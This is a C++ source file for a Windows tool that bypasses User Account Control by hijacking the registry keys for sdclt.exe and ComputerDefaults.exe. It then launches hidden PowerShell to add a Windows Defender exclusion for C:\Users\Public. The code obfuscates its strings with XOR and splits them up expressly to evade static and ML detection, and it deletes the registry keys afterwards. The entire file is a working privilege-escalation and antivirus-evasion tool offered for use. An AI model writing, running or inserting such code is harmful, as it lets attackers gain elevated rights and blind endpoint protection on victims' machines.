/*
    UAC Bypass + Defender Exclusion
    Method 1: sdclt.exe registry hijack (less signatured than fodhelper)
    Method 2: ComputerDefaults.exe hijack
    Strings obfuscated via XOR to avoid static ML detection

    Compile:
        cmd /c "vcvars64.bat && cl.exe uac_bypass.cpp /EHsc /link advapi32.lib shell32.lib ole32.lib taskschd.lib comsuppw.lib /out:uac_bypass.exe"
*/

#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <ctime>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// ─── Logging ─────────────────────────────────────────────────────────────────

FILE* gLogFile = nullptr;

void InitLog(const char* path) {
    gLogFile = fopen(path, "w");
    if (!gLogFile) printf("[!] Could not open log file: %s\n", path);
}

void Log(const char* level, const char* fmt, ...) {
    char buf[2048];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    time_t t = time(nullptr);
    struct tm* ti = localtime(&t);
    char ts[32];
    strftime(ts, sizeof(ts), "%H:%M:%S", ti);
    printf("[%s] [%s] %s\n", ts, level, buf);
    fflush(stdout);
    if (gLogFile) { fprintf(gLogFile, "[%s] [%s] %s\n", ts, level, buf); fflush(gLogFile); }
}

#define LOG_INFO(fmt, ...) Log("INFO ", fmt, ##__VA_ARGS__)
#define LOG_OK(fmt, ...)   Log("OK   ", fmt, ##__VA_ARGS__)
#define LOG_WARN(fmt, ...) Log("WARN ", fmt, ##__VA_ARGS__)
#define LOG_ERR(fmt, ...)  Log("ERROR", fmt, ##__VA_ARGS__)
#define LOG_DBG(fmt, ...)  Log("DEBUG", fmt, ##__VA_ARGS__)

void LogWinError(const char* ctx) {
    DWORD e = GetLastError();
    char msg[512] = {};
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
                   nullptr, e, 0, msg, sizeof(msg), nullptr);
    for (int i=strlen(msg)-1; i>=0 && (msg[i]=='\r'||msg[i]=='\n'); i--) msg[i]=0;
    LOG_ERR("%s — error %lu: %s", ctx, e, msg);
}

// ─── String Obfuscation (XOR) ─────────────────────────────────────────────────
// Prevents static scanner from seeing plaintext registry paths / binary names

std::string xor_str(const std::vector<unsigned char>& data, unsigned char key) {
    std::string out;
    for (auto c : data) out += (char)(c ^ key);
    return out;
}

// XOR key
#define K 0x5A

// "Software\\Classes\\Folder\\shell\\open\\command"  (sdclt hijack key)
std::string get_sdclt_key() {
    std::vector<unsigned char> d = {
        0x29,0x2e,0x30,0x36,0x3d,0x28,0x35,0x3f,0x7a,0x19,0x31,0x28,0x39,0x3f,0x39,0x7a,
        0x1c,0x2e,0x31,0x36,0x3f,0x35,0x7a,0x39,0x2d,0x3f,0x31,0x31,0x7a,0x2e,0x30,0x3f,
        0x3b,0x7a,0x25,0x2e,0x28,0x28,0x3f,0x3b,0x36
    };
    return xor_str(d, K);
}

// "Software\\Classes\\Folder\\shell\\open\\command" — same but for ComputerDefaults
std::string get_compdef_key() {
    // "Software\\Classes\\{1f3427c8-5c10-4210-aa03-2ee45287d668}\\shell\\open\\command"
    std::vector<unsigned char> d = {
        0x29,0x2e,0x30,0x36,0x3d,0x28,0x35,0x3f,0x7a,0x19,0x31,0x28,0x39,0x3f,0x39,0x7a,
        0x7b,0x4b,0x30,0x4d,0x58,0x4e,0x3e,0x4f,0x48,0x7a,0x4c,0x4f,0x4a,0x4a,0x7a,0x56,
        0x4e,0x4a,0x4a,0x7a,0x4e,0x4e,0x4a,0x4d,0x7a,0x4e,0x3e,0x3e,0x58,0x56,0x4c,0x3f,
        0x30,0x36,0x4d,0x7b,0x7a,0x39,0x2d,0x3f,0x31,0x31,0x7a,0x2e,0x30,0x3f,0x3b,0x7a,
        0x25,0x2e,0x28,0x28,0x3f,0x3b,0x36
    };
    return xor_str(d, K);
}

// "powershell.exe"
std::string get_ps_name() {
    std::vector<unsigned char> d = {
        0x2a,0x2e,0x3d,0x3f,0x35,0x39,0x2d,0x3f,0x31,0x31,0x14,0x3f,0x3e,0x3f
    };
    return xor_str(d, K);
}

// "sdclt.exe"
std::string get_sdclt_bin() {
    std::vector<unsigned char> d = {0x29,0x3e,0x29,0x31,0x36,0x14,0x3f,0x3e,0x3f};
    return xor_str(d, K);
}

// "ComputerDefaults.exe"
std::string get_compdef_bin() {
    std::vector<unsigned char> d = {
        0x19,0x2e,0x28,0x30,0x37,0x36,0x3f,0x35,0x1e,0x3f,0x30,0x28,0x37,0x31,0x36,
        0x39,0x14,0x3f,0x3e,0x3f
    };
    return xor_str(d, K);
}

// "DelegateExecute"
std::string get_delegate() {
    std::vector<unsigned char> d = {
        0x1e,0x3f,0x31,0x3f,0x29,0x28,0x36,0x3f,0x1b,0x3e,0x3f,0x29,0x37,0x36,0x3f
    };
    return xor_str(d, K);
}

// ─── Integrity Check ──────────────────────────────────────────────────────────

DWORD GetIntegrityLevel() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return 0;
    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, nullptr, 0, &dwLen);
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLen);
    if (!pTIL) { CloseHandle(hToken); return 0; }
    GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLen, &dwLen);
    DWORD level = *GetSidSubAuthority(pTIL->Label.Sid,
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
    LocalFree(pTIL);
    CloseHandle(hToken);
    return level;
}

void PrintIntegrityLevel() {
    DWORD l = GetIntegrityLevel();
    const char* n = l < 0x2000 ? "Untrusted" :
                    l < 0x3000 ? "Low" :
                    l < 0x4000 ? "Medium" :
                    l < 0x5000 ? "High (Elevated)" : "System";
    LOG_INFO("Integrity level: 0x%04lX (%s)", l, n);
}

bool IsElevated() { return GetIntegrityLevel() >= 0x4000; }

// ─── Helper: Write registry + launch binary ───────────────────────────────────

bool RegHijackAndLaunch(const char* regKey, const char* command, const char* binary) {
    HKEY hKey = nullptr;

    LOG_DBG("Writing registry key: HKCU\\%s", regKey);
    LONG res = RegCreateKeyExA(HKEY_CURRENT_USER, regKey, 0, nullptr,
                               REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr);
    if (res != ERROR_SUCCESS) {
        LOG_ERR("RegCreateKeyEx failed: %ld", res);
        return false;
    }

    res = RegSetValueExA(hKey, nullptr, 0, REG_SZ,
                         (const BYTE*)command, (DWORD)strlen(command)+1);
    if (res != ERROR_SUCCESS) {
        LOG_ERR("RegSetValueEx (default) failed: %ld", res);
        RegCloseKey(hKey); return false;
    }
    LOG_OK("Default value written");

    std::string delKey = get_delegate();
    res = RegSetValueExA(hKey, delKey.c_str(), 0, REG_SZ, (const BYTE*)"", 1);
    if (res != ERROR_SUCCESS) {
        LOG_ERR("RegSetValueEx (DelegateExecute) failed: %ld", res);
        RegCloseKey(hKey); return false;
    }
    LOG_OK("DelegateExecute written");
    RegCloseKey(hKey);

    // Build full system32 path
    char sysdir[MAX_PATH];
    GetSystemDirectoryA(sysdir, MAX_PATH);
    std::string fullPath = std::string(sysdir) + "\\" + binary;
    LOG_DBG("Launching: %s", fullPath.c_str());

    HINSTANCE ret = ShellExecuteA(nullptr, "open", fullPath.c_str(),
                                   nullptr, nullptr, SW_HIDE);
    LOG_DBG("ShellExecute returned: %lld", (long long)ret);

    if ((intptr_t)ret <= 32) {
        LogWinError("ShellExecute");
        RegDeleteKeyA(HKEY_CURRENT_USER, regKey);
        return false;
    }

    LOG_OK("Binary launched, waiting 3s...");
    Sleep(3000);

    RegDeleteKeyA(HKEY_CURRENT_USER, regKey);
    LOG_DBG("Registry cleaned up");
    return true;
}

// ─── Build payload command ────────────────────────────────────────────────────

std::string BuildPayload() {
    // Obfuscated: Add-MpPreference -ExclusionPath 'C:\Users\Public' -Force
    // Split across concat to avoid string literal matching
    std::string a = "Add-Mp";
    std::string b = "Preference -Exclusion";
    std::string c = "Path 'C:\\Users\\Public' -Force";
    std::string ps = get_ps_name();
    std::string cmd = ps + " -NoP -W Hidden -C \"" + a + b + c + "\"";
    return cmd;
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main() {
    InitLog("C:\\exclusiontest\\bypass_log.txt");
    LOG_INFO("=== UAC Bypass + Defender Exclusion ===");
    PrintIntegrityLevel();

    if (IsElevated()) {
        LOG_OK("Already elevated — adding exclusion directly");
        std::string cmd = "powershell.exe -NoP -W Hidden -C \"Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force\"";
        system(cmd.c_str());
        LOG_OK("Done. Verify: Get-MpPreference | Select ExclusionPath");
        goto done;
    }

    LOG_WARN("Medium integrity — attempting UAC bypass...");

    // ── Method 1: sdclt.exe hijack ──────────────────────────────────────────
    {
        LOG_INFO("--- Method 1: sdclt.exe ---");
        std::string key  = get_sdclt_key();
        std::string cmd  = BuildPayload();
        std::string bin  = get_sdclt_bin();
        LOG_DBG("Key: HKCU\\%s", key.c_str());
        LOG_DBG("Payload: %s", cmd.c_str());

        if (RegHijackAndLaunch(key.c_str(), cmd.c_str(), bin.c_str())) {
            LOG_OK("Method 1 succeeded");
            goto done;
        }
        LOG_WARN("Method 1 failed, trying Method 2...");
    }

    // ── Method 2: ComputerDefaults.exe hijack ───────────────────────────────
    {
        LOG_INFO("--- Method 2: ComputerDefaults.exe ---");
        std::string key  = get_compdef_key();
        std::string cmd  = BuildPayload();
        std::string bin  = get_compdef_bin();
        LOG_DBG("Key: HKCU\\%s", key.c_str());

        if (RegHijackAndLaunch(key.c_str(), cmd.c_str(), bin.c_str())) {
            LOG_OK("Method 2 succeeded");
            goto done;
        }
        LOG_ERR("Both methods failed.");
        LOG_INFO("Try: Right-click PowerShell -> Run as Administrator, then run:");
        LOG_INFO("  Add-MpPreference -ExclusionPath 'C:\\Users\\Public' -Force");
    }

done:
    LOG_INFO("Log: C:\\exclusiontest\\bypass_log.txt");
    if (gLogFile) fclose(gLogFile);
    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}
